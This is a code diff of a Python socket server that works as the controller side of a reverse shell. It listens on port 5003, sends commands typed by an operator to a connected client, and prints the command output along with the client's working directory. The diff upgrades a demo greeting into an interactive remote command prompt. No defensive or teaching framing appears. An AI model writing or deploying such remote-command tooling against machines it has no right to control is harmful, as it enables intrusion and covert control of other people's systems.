@@ -2,8 +2,9 @@ import socket
 
 SERVER_HOST = "0.0.0.0"
 SERVER_PORT = 5003
-
-BUFFER_SIZE = 1024
+BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
+# separator string for sending 2 messages in one go
+SEPARATOR = "<sep>"
 
 # create a socket object
 s = socket.socket()
@@ -20,21 +21,27 @@ print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
 client_socket, client_address = s.accept()
 print(f"{client_address[0]}:{client_address[1]} Connected!")
 
-# just sending a message, for demonstration purposes
-message = "Hello and Welcome".encode()
-client_socket.send(message)
+# receiving the current working directory of the client
+cwd = client_socket.recv(BUFFER_SIZE).decode()
+print("[+] Current working directory:", cwd)
 
 while True:
     # get the command from prompt
-    command = input("Enter the command you wanna execute:")
+    command = input(f"{cwd} $> ")
+    if not command.strip():
+        # empty command
+        continue
     # send the command to the client
     client_socket.send(command.encode())
     if command.lower() == "exit":
         # if the command is exit, just break out of the loop
         break
     # retrieve command results
-    results = client_socket.recv(BUFFER_SIZE).decode()
-    # print them
+    output = client_socket.recv(BUFFER_SIZE).decode()
+    print("output:", output)
+    # split command output and current directory
+    results, cwd = output.split(SEPARATOR)
+    # print output
     print(results)
 # close connection to the client
 client_socket.close()
